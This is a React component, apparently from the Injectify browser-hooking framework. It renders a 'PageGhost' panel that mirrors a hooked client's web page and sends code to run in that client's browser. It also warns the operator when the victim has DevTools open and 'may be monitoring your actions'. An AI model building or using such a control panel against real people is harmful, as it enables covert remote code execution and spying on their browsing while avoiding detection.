import React from 'react'
import { withStyles } from 'material-ui/styles'
import { connect } from 'react-redux'
import _ from 'lodash'

import Rnd from 'react-rnd'
import Tooltip from 'material-ui/Tooltip'

import IconButton from 'material-ui/IconButton'
import OpenIcon from 'material-ui-icons/OpenInNew'
import CloseIcon from 'material-ui-icons/Close'
import HTTP from 'material-ui-icons/Http'
import HTTPS from 'material-ui-icons/Https'

import Window from './Window'
import GetStarted from './Overlays/GetStarted'
import { closePageGhost, execute } from '../../../../../actions'

const styles = theme => ({
  root: {
    display: 'flex',
    flexDirection: 'column',
    overflow: 'hidden',
    width: '100%',
    height: '100%',
    borderTopLeftRadius: 3,
    fontFamily: 'Roboto',
  },
  header: {
    display: 'flex',
    flexDirection: 'column',
    backgroundColor: '#514E4F',
    alignItems: 'center',
    lineHeight: 1,
    boxShadow: 'rgba(62, 61, 61, 0.71) 0px 1px 3px',
    width: '100%',
    boxSizing: 'border-box',
    flexShrink: 0
  },
  content: {
    display: 'flex',
    padding: '0.5rem',
    height: '2.7rem',
    width: '100%',
    alignItems: 'center'
  },
  address: {
    display: 'flex',
    overflow: 'hidden',
    height: '1.6rem',
    width: 'calc(100% - (48 * 2px))',
    borderRadius: 2,
    color: 'rgba(255, 255, 255, 0.9)',
    backgroundColor: 'rgba(255,255,255,0.1)',
    boxShadow: '0px 0px 1px 0 rgba(0, 0, 0, 0.55)',
    padding: 2
  },
  warning: {
    width: '100%',
    zIndex: 1,
    backgroundColor: 'rgba(0, 0, 0, 0.1)',
    color: 'rgba(255, 255, 255, 0.82)',
    padding: 8,
    fontSize: 13,
    fontWeight: 500,
    userSelect: 'none',
    textAlign: 'center'
  },
  indicator: {
    display: 'flex',
    height: '100%',
    padding: '2px 0',
    userSelect: 'none',
    '& svg': {
      height: '100%',
    }
  },
  secure: {
    color: '#95f7c4'
  },
  security: {

  },
  level: {
    fontSize: '13px',
    lineHeight: '18px',
    padding: '0 5px',
    marginRight: 5,
    borderRight: '1px solid rgba(255, 255, 255, 0.34)',
    whiteSpace: 'nowrap'
  },
  url: {
    height: '100%',
    width: '100%',
    color: 'inherit',
    padding: 4,
    fontSize: '13px',
    whiteSpace: 'nowrap',
  },
  button: {
    color: '#9e9e9e'
  },
  light: {
    opacity: 0.7
  }
})

class PageGhost extends React.Component {
  listener = null
  iframe = null

  componentDidMount() {
    this.listener = this.message.bind(this)
    this.transportListener = this.transport.bind(this)
    window.addEventListener('PageGhost', this.listener)
    window.addEventListener('message', this.transportListener)
  }

  componentWillUnmount() {
    window.removeEventListener('PageGhost', this.listener)
    window.removeEventListener('message', this.transportListener)
  }

  message = ({ data }) => {
    if (this.iframe) this.iframe.contentWindow.postMessage(data, '*')
  }

  transport = ({ data }) => {
    if (data instanceof Object && data.type === 'PageGhost') {
      let { id, event } = data
      switch (event) {
        case 'refresh':
          this.execute(`injectify.module('pageghost', true)`)
          break
        case 'execute':
          this.execute(data.data)
          break
        case 'scroll':
          this.execute(data.data, { scroll: true })
          break
      }
    }
  }

  execute = (code, topic) => {
    const { dispatch, pageGhost } = this.props
    dispatch(execute(code, 'selected', pageGhost.selected, topic))
  }

  triggerResize = (state = false) => {
    if (state) {
      this.dynamicResize = setInterval(() => {
        window.dispatchEvent(new Event('resize'))
      }, 100)
    } else {
      clearInterval(this.dynamicResize)
      window.dispatchEvent(new Event('resize'))
    }
  }

  setRef = ref => {
    this.iframe = ref
  }

  get info() {
    const { projects, selectedProject, pageGhost } = this.props
    const project = projects[selectedProject.index]
    const client = project.console.state.clients ? project.console.state.clients[project.console.state.selected] : null
    const session = client ? _.find(client.sessions, { id: pageGhost.selected }) : null
    return {
      project,
      client,
      session,
      url: session ? new URL(session.window.url) : null
    }
  }

  render () {
    const { classes, pageGhost, dispatch } = this.props
    const { project, client, session, url } = this.info

    let warning = null

    if (client && session) {
      if (url.protocol === 'http:' && location.procotol === 'https:') {
        warning = ['#c12b2b', `Injectify is served over HTTPS but target site is using HTTP. The below page may not work correctly until it's opened in a new window.`]
      }
      if (session.devtools.open) {
        if (session.debug) {
          warning = ['#8E4DFF', `INFO: DevTools open`]
        } else {
          warning = ['#8E4DFF', `WARNING: It was detected that the client has DevTools open! It's possible they may be monitoring your actions`]
        }
      }
    }

    return (
      <Rnd
        bounds="parent"
        default={{ width: 400 }}
        enableResizing={{
          top: false,
          right: false,
          bottom: false,
          left: true,
          topRight: false,
          bottomRight: false,
          bottomLeft: false,
          topLeft: false
        }}
        onResizeStart={() => this.triggerResize(true)}
        onResizeStop={() => this.triggerResize(false)}
        disableDragging={true}
        className="inject-pageghost"
        minWidth={80}
        resizeHandleClasses={{ left: 'resizer' }}
      >
        <div className={classes.root}>
          {client ? session ? (
            <React.Fragment>
              <div className={classes.header} style={{ backgroundColor: warning ? warning[0] : null }}>
                <div className={classes.content}>
                  <div className={classes.address}>
                    <div className={`${classes.indicator} ${url.protocol === 'https:' ? classes.secure : ''}`}>
                      {url.protocol === 'https:' ? (
                        <React.Fragment>
                          <HTTPS className={classes.security} />
                          <span className={classes.level}>Secure</span>
                        </React.Fragment>
                      ) : (
                        <React.Fragment>
                          <HTTP className={classes.security} />
                          <span className={classes.level}>Not secure</span>
                        </React.Fragment>
                      )}
                    </div>
                    <div className={classes.url}>
                      <span className={classes.light}>{url.protocol}//</span>
                      <span>{url.host}</span>
                      <span className={classes.light}>{url.pathname}</span>
                      <span className={classes.light}>{url.search}</span>
                    </div>
                  </div>
                  <Tooltip title='Open in new window' placement='bottom'>
                    <IconButton className={classes.button}>
                      <OpenIcon />
                    </IconButton>
                  </Tooltip>
                  <Tooltip title='Close PageGhost sessions' placement='bottom'>
                    <IconButton className={classes.button} onClick={() => dispatch(closePageGhost())}>
                      <CloseIcon />
                    </IconButton>
                  </Tooltip>
                </div>
                {warning && <div className={classes.warning}>
                  {warning[1]}
                </div>}
              </div>
              <Window setRef={this.setRef.bind(this)} />
            </React.Fragment>
          ) : (
            <GetStarted type="pageghost" />
          ) : (
            <GetStarted type="select-client" />
          )}
        </div>
      </Rnd>
    )
  }
}

export default connect(({ injectify: {projects, selectedProject, pageGhost} }) => ({ projects, selectedProject, pageGhost }))(withStyles(styles)(PageGhost))
